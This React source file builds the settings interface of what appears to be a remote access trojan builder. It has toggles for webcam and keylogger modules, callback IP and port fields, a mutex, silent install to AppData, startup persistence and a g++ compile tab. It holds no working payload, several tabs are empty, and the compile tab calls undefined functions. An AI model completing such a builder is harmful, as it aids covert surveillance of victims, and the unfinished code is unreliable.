import React, {useState} from 'react';
import {
    Button,
    Checkbox,
    Tab,
    Tabs,
    Box,
    TextField,
    Select,
    Typography,
    MenuItem,
    Paper,
    Grid,
    Divider, FormControlLabel, Chip, IconButton
} from '@mui/material';
import {Cached} from "@mui/icons-material";

function CompilerGUI() {
    // Estados para los checkboxes y otros componentes interactivos
    const [webcamChecked, setWebcamChecked] = useState(false);
    const [keyloggerChecked, setKeyloggerChecked] = useState(false);
    const [tag, setTag] = useState("");
    const [mutex, setMutex] = useState("");
    const [ip, setIp] = useState("");
    const [port, setPort] = useState("");
    const [timing, setTiming] = useState("");
    const [isInstallationEnabled, setIsInstallationEnabled] = useState(false);
    const [isStartupEnabled, setIsStartupEnabled] = useState(false);


    // Estado para las pestañas
    const [currentTab, setCurrentTab] = useState(0);

    return (
        <Paper elevation={10} sx={{height: '82vh', maxHeight: '82vh', overflow: 'auto', maxWidth: '100%'}}>
            {/* Pestañas */}
            <Tabs value={currentTab} onChange={(event, newValue) => setCurrentTab(newValue)}>
                <Tab label="Identification"/>
                <Tab label="Installation"/>
                <Tab label="Modules"/>
                <Tab label="Assembly"/>
                <Tab label="Compile"/>
            </Tabs>

            {/* Contenido de las pestañas */}
            <Box sx={{maxHeight: '65vh', width: '100%'}}>
                {currentTab === 0 && (
                    <Box sx={{ display: 'flex', flexDirection: 'column', gap: '1vh',p:2}}>
                        <Divider  sx={{ margin: '0.5rem 0' }} textAlign="left">
                                <Chip label="Identification" />
                        </Divider>
                        <Box sx={{ display: 'flex', gap: '1rem', flexWrap: 'wrap' }}>
                            <Box sx={{ flex: '1 1 calc(50% - 1rem)',display:'flex' }}>
                                <TextField label="Mutex" placeholder="2f3dc5e1-18f0-4167-baf1-ddb47cb8d346" helperText="Mutex is used to avoid executing the same client multiple times. It's recommened to be autogenerated" fullWidth />
                            </Box>
                            <Box sx={{ flex: '1 1 calc(40% - 1rem)' }}>
                                <TextField label="Tag name"  placeholder="Client" helperText="Client tag for connection identification" fullWidth />
                            </Box>
                            <Box sx={{ flex: '1 1 calc(20% - 1rem)' }}>
                                <TextField label="IP address"  placeholder="127.0.0.1" helperText="IP address (IPv4 only supported)" fullWidth />
                            </Box>
                            <Box sx={{ flex: '1 1 calc(20% - 1rem)' }}>
                                <TextField label="Port"  placeholder="3055" helperText="Port (1024 to 65536)" fullWidth />

                            </Box>
                            <Box sx={{ flex: '1 1 calc(20% - 1rem)' }}>
                                <TextField label="Delay"  placeholder="10000" helperText="Retray delay. The time it will take the client to retry a connection (ms)" fullWidth />

                            </Box>
                        </Box>

                        <Divider textAlign="left">
                            <Chip label="Installation" />
                        </Divider>


                        <Box sx={{ flex: '1' }}>
                            <FormControlLabel
                                control={<Checkbox onChange={() => setIsInstallationEnabled(!isInstallationEnabled)} />}
                                label="Install"
                            />
                            <FormControlLabel
                                control={<Checkbox onChange={() => setIsStartupEnabled(!isStartupEnabled)} />}
                                label="Startup"
                            />
                        </Box>


                        <Box sx={{ display: 'flex', gap: '1rem', flexWrap: 'wrap' }}>
                            <Box sx={{ flex: '1 1 calc(33.33% - 1rem)' }}>
                                <Select
                                    fullWidth
                                    disabled={!isInstallationEnabled}
                                    defaultValue="AppData" // set a default value
                                    onChange={(event) => {
                                        // handle the selected value here
                                        console.log(event.target.value);
                                    }}
                                >
                                    <MenuItem value="Program files (x86)">Option 1</MenuItem>
                                    <MenuItem value="System directory">Option 2</MenuItem>
                                    <MenuItem value="AppData">Option 3</MenuItem>
                                </Select>
                                <Typography variant="caption">Path where the client will be installed (AppData: no admin privileges required)</Typography>
                            </Box>
                            <Box sx={{ flex: '1 1 calc(33.33% - 1rem)' }}>
                                <TextField helperText="Folder name where the client will be installed" fullWidth disabled={!isInstallationEnabled} />
                            </Box>
                            <Box sx={{ flex: '1 1 calc(33.33% - 1rem)' }}>
                                <TextField helperText="Executable name inside installation folder" fullWidth disabled={!isInstallationEnabled} />
                            </Box>
                        </Box>

                        <Box sx={{ display: 'flex', gap: '1rem', flexWrap: 'wrap', marginTop: '1rem' }}>

                            <Box sx={{ flex: '1 1 calc(50% - 1rem)' }}>
                                <TextField helperText="Some important text" fullWidth disabled={!isStartupEnabled} />
                            </Box>
                        </Box>
                    </Box>
                        )}
                        {currentTab === 1 && (
                            <div>
                                {/* Contenido del tab Installation */}
                            </div>
                        )}
                        {currentTab === 2 && (
                            <div>
                                {/* Contenido del tab Modules */}
                            </div>
                        )}
                        {currentTab === 3 && (
                            <div>
                                {/* Contenido del tab Assembly */}
                            </div>
                        )}
                        {currentTab === 4 && (
                            <div>
                                {currentTab === 4 && (
                                    <div>
                                        <Typography variant="h6">
                                            Path where g++ and windres is located if it isnt in the system variables:
                                        </Typography>
                                        <Select
                                            value={"compilerOption"}
                                            onChange={(event) => setCompilerOption(event.target.value)}
                                        >
                                            <MenuItem value="Default system compiler">Default system compiler</MenuItem>
                                            <MenuItem value="Select custom path">Select custom path</MenuItem>
                                        </Select>
                                        {"compilerOption" === "Select custom path" && (
                                            <TextField
                                                label="Compiler Path"
                                                value={"compilerPath"}
                                                onChange={(event) => setCompilerPath(event.target.value)}
                                            />
                                        )}
                                    </div>
                                )}
                            </div>
                        )}
                    </Box>
                    </Paper>
                    );
                }

                export default CompilerGUI;
